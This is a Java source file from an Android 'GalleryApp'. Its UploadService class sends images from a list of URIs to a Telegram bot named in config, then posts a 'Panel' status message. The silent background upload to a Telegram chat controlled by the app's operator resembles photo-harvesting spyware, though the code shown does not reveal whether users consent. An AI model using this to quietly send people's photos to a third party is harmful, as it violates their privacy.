package com.example.galleryapp;

import android.content.Context;
import android.net.Uri;
import android.util.Log;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.Map;

public class UploadService {
    private final Context context;
    private final Map<String, String> config;

    public UploadService(Context context) {
        this.context = context;
        this.config = ConfigReader.readConfig(context);
    }

    public void uploadImages(List<Uri> uris) {
        new Thread(() -> {
            String token = config.get("BOT_TOKEN");
            String chatId = config.get("CHAT_ID");
            if (token == null || chatId == null) { Log.e("Upload","ناقص"); return; }
            int success = 0;
            for (Uri uri : uris) if (sendPhoto(token, chatId, uri)) success++;
            sendMessage(token, chatId,
                "📊 *GalleryApp Panel*\n✅ تم رفع: " + success + "/" + uris.size() + "\n🟢 الحالة: نشط");
        }).start();
    }

    private boolean sendPhoto(String token, String chatId, Uri uri) {
        String b = "----B" + System.currentTimeMillis();
        try {
            HttpURLConnection c = (HttpURLConnection) new URL("https://api.telegram.org/bot"+token+"/sendPhoto").openConnection();
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setRequestProperty("Content-Type","multipart/form-data; boundary="+b);
            try (OutputStream o = c.getOutputStream();
                 InputStream i = context.getContentResolver().openInputStream(uri)) {
                o.write(("--"+b+"\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n"+chatId+"\r\n").getBytes());
                o.write(("--"+b+"\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"img.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n").getBytes());
                byte[] buf = new byte[4096]; int n;
                while ((n = i.read(buf)) != -1) o.write(buf,0,n);
                o.write(("\r\n--"+b+"--\r\n").getBytes());
            }
            int code = c.getResponseCode(); c.disconnect();
            return code == 200;
        } catch (Exception e) { Log.e("Upload","err",e); return false; }
    }

    private void sendMessage(String token, String chatId, String text) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL("https://api.telegram.org/bot"+token+"/sendMessage").openConnection();
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
            String body = "chat_id="+chatId+"&text="+java.net.URLEncoder.encode(text,"UTF-8")+"&parse_mode=Markdown";
            try (OutputStream o = c.getOutputStream()) { o.write(body.getBytes()); }
            c.getResponseCode(); c.disconnect();
        } catch (Exception e) { Log.e("Upload","msg err",e); }
    }
}
